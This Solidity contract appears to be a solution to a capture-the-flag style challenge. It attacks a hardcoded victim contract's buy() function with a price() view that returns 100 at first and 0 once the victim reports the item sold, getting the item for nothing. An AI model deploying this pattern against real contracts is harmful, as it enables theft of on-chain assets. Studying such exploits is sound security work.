// SPDC_LICENSE_IDENTIFIER: MIT
pragma solidity ^0.8.6;
interface ISold {
    function isSold() external view returns (bool);
    function buy() external;
}
contract MutableView {
    address victim = 0x1916596F5F99DECC859c72c331aC28A461483Fe5;
    function price() public view returns (uint256) {
        if (ISold(msg.sender).isSold()) return 0;
        return 100;
    }
    function attack() external {
        ISold(victim).buy();
    }
}
